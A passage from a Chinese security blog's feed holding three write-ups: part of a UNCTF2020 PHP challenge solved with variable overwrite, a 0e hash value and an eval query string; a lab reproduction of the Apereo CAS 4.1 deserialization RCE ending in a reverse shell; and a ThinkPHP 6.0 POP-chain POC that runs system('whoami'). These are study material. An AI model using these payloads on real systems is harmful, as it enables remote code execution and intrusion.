</span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br></pre></td></tr></table></figure><p>存在变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($password) === $adminPassword<span class="comment">//只需要传入任意值和其md5值分给赋给$password和$adminPassword即可</span></span><br></pre></td></tr></table></figure><p>php弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure><p>只有以科学计数法0e开头的才可能满足条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i5 = <span class="number">0</span>; $i5 &lt;= <span class="number">9999999999</span>; $i5++) &#123;</span><br><span class="line">    $res = <span class="string">'0e'</span> . $i5;</span><br><span class="line">    <span class="comment">//0e1290633704</span></span><br><span class="line">    <span class="keyword">if</span> ($res == hash(<span class="string">'sha1'</span>, $res)) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php复杂变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检测匹配以var开头跟1到2个数字字符的变量值，这里利用php复杂变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?source&#x3D;&amp;adminPassword&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1&amp;verif&#x3D;0e1290633704&amp;var1&#x3D;&#123;$_GET[1]&#125;&amp;var3&#x3D;$&#123;$var1()&#125;&amp;1&#x3D;phpinfo</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;UNCTF2020赛题部分WP&quot;&gt;&lt;a href=&quot;#UNCTF2020赛题部分WP&quot; class=&quot;headerlink&quot; title=&quot;UNCTF2020赛题部分WP&quot;&gt;&lt;/a&gt;UNCTF2020赛题部分WP
    
    </summary>
    
    
    
      <category term="UNCTF" scheme="http://yoursite.com/tags/UNCTF/"/>
    
  </entry>
  
  <entry>
    <title>Apereo-CAS-4.1-反序列化命令执行</title>
    <link href="http://yoursite.com/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-11-08T05:29:14.000Z</published>
    <updated>2020-11-09T11:48:22.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apereo-CAS-4-1-反序列化命令执行"><a href="#Apereo-CAS-4-1-反序列化命令执行" class="headerlink" title="Apereo-CAS-4.1-反序列化命令执行"></a>Apereo-CAS-4.1-反序列化命令执行<a id="more"></a></h2><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是基于此系统二次开发</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Apereo-CAS&lt;=4.1.6</li></ul><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">centos</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看cas中登录的配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#/WEB-INF/cas-servlet.cml:151行</span><br><span class="line">&lt;bean id=<span class="string">"loginHandlerAdapter"</span></span><br><span class="line">       <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter"</span></span><br><span class="line">       p:supportedFlowId=<span class="string">"login"</span></span><br><span class="line">       p:flowExecutor-ref=<span class="string">"loginFlowExecutor"</span></span><br><span class="line">       p:flowUrlHandler-ref=<span class="string">"loginFlowUrlHandler"</span> /&gt;</span><br></pre></td></tr></table></figure><p>每次登录都会调用<code>SelectiveFlowHandlerAdapter</code>类中的<code>handle</code>方法进行处理，关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FlowHandler flowHandler = (FlowHandler)handler;</span><br><span class="line">        <span class="keyword">this</span>.checkAndPrepare(request, response, <span class="keyword">false</span>);      </span><br><span class="line">        <span class="comment">// flowExecutionKey是POST的“execution”的参数值，其中的flowUrlHandler在登录相关的配置文件中有配置“p:flowUrlHandler-ref="loginFlowUrlHandler"”</span></span><br><span class="line">        String flowExecutionKey = <span class="keyword">this</span>.flowUrlHandler.getFlowExecutionKey(request);</span><br><span class="line">        <span class="keyword">if</span> (flowExecutionKey != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ServletExternalContext context = <span class="keyword">this</span>.createServletExternalContext(request, response);               </span><br><span class="line"> <span class="comment">//用来恢复execute中存储的当前状态，漏洞从这里开始，其中flowExecutor在登录相关的配置文件中可以找到</span></span><br><span class="line"><span class="comment">//p:flowExecutor-ref="loginFlowExecutor"，loginFlowExecutor对应的类为“org.springframework.webflow.executor.FlowExecutorImpl”</span></span><br><span class="line">                FlowExecutionResult result = <span class="keyword">this</span>.flowExecutor.resumeExecution(flowExecutionKey, context);</span><br><span class="line">                <span class="keyword">this</span>.handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br></pre></td></tr></table></figure><p>接着跟进<code>this.flowExecutor.resumeExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.executor.FlowExecutorImpl.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FlowExecutionResult <span class="title">resumeExecution</span><span class="params">(String flowExecutionKey, ExternalContext context)</span> <span class="keyword">throws</span> FlowException </span>&#123;</span><br><span class="line">        FlowExecutionResult var6;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Resuming flow execution with key '"</span> + flowExecutionKey);</span><br><span class="line">            &#125;</span><br><span class="line">            ExternalContextHolder.setExternalContext(context);</span><br><span class="line">            <span class="comment">// 简单解析flowExecutionKey的数据到FlowExecutionKey对象，供后续使用</span></span><br><span class="line">            FlowExecutionKey key = <span class="keyword">this</span>.executionRepository.parseFlowExecutionKey(flowExecutionKey);</span><br><span class="line">            FlowExecutionLock lock = <span class="keyword">this</span>.executionRepository.getLock(key);</span><br><span class="line">            lock.lock();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过FlowExecutionKey恢复状态，其中处理不当导致了反序列化漏洞</span></span><br><span class="line">                FlowExecution flowExecution = <span class="keyword">this</span>.executionRepository.getFlowExecution(key);</span><br><span class="line">                flowExecution.resume(context);</span><br></pre></td></tr></table></figure><p>继续跟进<code>this.executionRepository.getFlowExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FlowExecution <span class="title">getFlowExecution</span><span class="params">(FlowExecutionKey key)</span> <span class="keyword">throws</span> FlowExecutionRepositoryException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(key <span class="keyword">instanceof</span> ClientFlowExecutionKey)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Expected instance of ClientFlowExecutionKey but got "</span> + key.getClass().getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 从上一步解析出的key对象中获取序列化相关的数据</span></span><br><span class="line">            <span class="keyword">byte</span>[] encoded = ((ClientFlowExecutionKey)key).getData();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//在this.transcoder.decode(encoded)代码解密中同时进行了反序列化恢复状态</span></span><br><span class="line">                ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)<span class="keyword">this</span>.transcoder.decode(encoded);</span><br></pre></td></tr></table></figure><p>漏洞触发点在解密代码处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">decode</span><span class="params">(<span class="keyword">byte</span>[] encoded)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = <span class="keyword">this</span>.cipherBean.decrypt(encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Decryption error"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream inBuffer = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">        Object var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.compression) &#123;</span><br><span class="line">                in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> GZIPInputStream(inBuffer));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                in = <span class="keyword">new</span> ObjectInputStream(inBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 触发反序列化漏洞</span></span><br><span class="line">            var5 = in.readObject();</span><br></pre></td></tr></table></figure><p>调用了<code>cipherBean</code>对密文进行解密，之后进行了反序列化，调用的decode方法属于<code>EncryptedTranscoder</code>类，该类还定义了encode，直接调用<code>org.jasig.spring.webflow.plugin.EncryptedTranscoder#encode</code>生成加密字节数组后<code>base64</code>，加上<code>uuid-</code>构成execution的值</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>/ip/cas/login</code></p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png" class=""><p>输入账号、密码，用burp抓包</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png" class=""><p>可以看到这里有个<code>execution</code>参数，这里就是利用点，下面用给的<code>jar</code>包生成<code>poc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">这里要用到ysoserial这个java反序列化poc生成工具，可以从下面的网址下载</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial</span><br><span class="line">具体的使用方法暂时还没有搞清楚（找个时间研究一下），找了个已经给了jar包的地址，如下</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;Apereo-CAS-Attack&#x2F;releases&#x2F;tag&#x2F;v1.0.0</span><br></pre></td></tr></table></figure><p>命令行进入到<code>apereo-cas-attack-1.0-SNAPSHOT-all.jar</code>所在目录，尝试使用在<code>/tmp</code>目录下创建<code>success</code>文件</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png" class=""><p>在burp中把<code>execution</code>的参数值替换掉，Go一下</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png" class=""><p>进入docker容器中进行查看</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png" class=""><p>可以看到创建成功了，也就是说命令成功执行了</p><p>下面可以试试反弹shell</p><p>这里有个生成反弹shell的网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.jackson-t.ca&#x2F;runtime-exec-payloads.html</span><br></pre></td></tr></table></figure><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png" class=""><p>接着再生成poc，重复上面的步骤</p><p>在服务器上监听2000端口，打过去，可以看到shell成功反弹了</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png" class=""><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;226149.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;caiqiiqi&#x2F;article&#x2F;details&#x2F;104943640</span><br><span class="line">https:&#x2F;&#x2F;www.00theway.org&#x2F;2020&#x2F;01&#x2F;04&#x2F;apereo-cas-rce&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Apereo-CAS-4-1-反序列化命令执行&quot;&gt;&lt;a href=&quot;#Apereo-CAS-4-1-反序列化命令执行&quot; class=&quot;headerlink&quot; title=&quot;Apereo-CAS-4.1-反序列化命令执行&quot;&gt;&lt;/a&gt;Apereo-CAS-4.1-反序列化命令执行
    
    </summary>
    
    
    
      <category term="maven" scheme="http://yoursite.com/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>tp6unserialize</title>
    <link href="http://yoursite.com/2020/11/04/tp6unserialize/"/>
    <id>http://yoursite.com/2020/11/04/tp6unserialize/</id>
    <published>2020-11-04T10:30:14.000Z</published>
    <updated>2021-01-22T10:52:11.530Z</updated>
    
    <content type="html"><![CDATA[<h3 id="tp6-0反序列化链子"><a href="#tp6-0反序列化链子" class="headerlink" title="tp6.0反序列化链子"></a>tp6.0反序列化链子<a id="more"></a></h3><p>有了<code>tp5.0.x</code>的经验，会好很多</p><p>还是<code>__destruct()</code>析构函数起手，<code>vendor/topthink/think-orm/src/Model.php</code>可用</p><img src="/2020/11/04/tp6unserialize/1.png" class=""><p>根据逻辑判断只有让<code>$this-&gt;lazySave</code>为<code>True</code>，才能进入<code>save()</code>，跟进</p><img src="/2020/11/04/tp6unserialize/2.png" class=""><p>可用方法为<code>updateData</code>，前面的<code>if</code>判断就不能让它成立,即下面的条件</p><ul><li><code>$this-&gt;isEmpty()</code>要返回false</li><li><code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>要返回true</li><li><code>$this-&gt;exists</code>返回为true</li></ul><img src="/2020/11/04/tp6unserialize/3.png" class=""><p><code>data</code>为非空数组</p><img src="/2020/11/04/tp6unserialize/4.png" class=""><p><code>$this-&gt;withEvent</code>简单可控，让其为false就能够返回true</p><p>下面跟一下<code>updateData</code>方法</p><img src="/2020/11/04/tp6unserialize/5.png" class=""><p>需要绕过<code>return</code>，这里的<code>$data=$this-&gt;getChangeData()</code>要为非空</p><img src="/2020/11/04/tp6unserialize/6.png" class=""><p>这里让<code>$this-&gt;force</code>为true，直接返回前面构造的非空<code>$this-&gt;data</code></p><p>接着来看<code>checkAllowFields</code>,跟进</p><img src="/2020/11/04/tp6unserialize/7.png" class=""><p>这里的<code>$this-&gt;field</code>和<code>$this-&gt;schema</code>默认为空，条件成立进入else语句,跟进<code>db()</code></p><img src="/2020/11/04/tp6unserialize/8.png" class=""><p><code>db</code>中进行了字符串的拼接，也就是说<code>$this-&gt;name</code>或者<code>$this-&gt;suffix</code>为类对象时，就会触发<code>__toString()</code>方法</p><p>下面用到的还是 <code>Conversion</code>类中的 <code>__toString-&gt;toJson-&gt;toArray</code>一条,然后就到了 <code>getAttr</code>方法了</p><img src="/2020/11/04/tp6unserialize/9.png" class=""><p>下面接着跟进</p><img src="/2020/11/04/tp6unserialize/10.png" class=""><img src="/2020/11/04/tp6unserialize/11.png" class=""><p>满足<code>$this-&gt;withAttr[$key]</code>存在且<code>$this-&gt;withAttr[$key]</code>不为数组就可以触发命令执行</p><p>最终会把<code>$this-&gt;withAttr[$key]</code>作为函数名动态执行函数，而<code>$value</code>作为参数，就可以利用执行系统函数达到命令执行</p><p>pop调用链</p><img src="/2020/11/04/tp6unserialize/13.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POC</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"peguin"</span> =&gt; <span class="string">"whoami"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"peguin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure><img src="/2020/11/04/tp6unserialize/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;tp6-0反序列化链子&quot;&gt;&lt;a href=&quot;#tp6-0反序列化链子&quot; class=&quot;headerlink&quot; title=&quot;tp6.0反序列化链子&quot;&gt;&lt;/a&gt;tp6.0反序列化链子
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
</feed>
